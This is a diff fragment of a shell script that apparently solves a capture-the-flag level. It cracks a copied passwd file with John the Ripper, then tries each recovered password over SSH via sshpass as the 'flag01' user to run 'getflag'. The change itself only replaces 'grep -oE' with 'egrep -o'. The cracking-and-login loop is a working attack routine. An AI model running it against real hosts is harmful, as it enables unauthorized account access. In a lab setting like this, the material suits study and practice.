@@ -34,13 +34,13 @@ for READABLE_PASSWD_FILE in ${READABLE_PASSWD_FILES}; do
 	mv ${LOCAL_FILE}.tmp ${LOCAL_FILE}
 
 	# Crack the password(s) of the `flag01` user using John the Ripper
-	POTENTIAL_PASSWORDS=$(john ${LOCAL_FILE} 2>/dev/null | tail -n +2 | grep -oE '^[^ ]+')
+	POTENTIAL_PASSWORDS=$(john ${LOCAL_FILE} 2>/dev/null | tail -n +2 | egrep -o '^[^ ]+')
 
 	for POTENTIAL_PASSWORD in ${POTENTIAL_PASSWORDS}; do
 		# Try to connect to the virtual machine and run the `getflag` command as the `flag01` user
 		if
 			sshpass -p ${POTENTIAL_PASSWORD} >${FLAG} 2>/dev/null \
-				ssh -p ${PORT} flag01@${ADDRESS} "getflag | grep -oE '[^ ]+$'"
+				ssh -p ${PORT} flag01@${ADDRESS} "getflag | egrep -o '[^ ]+$'"
 		then
 			# Found the correct password and saved the token
 			rm -rf ${TMP}
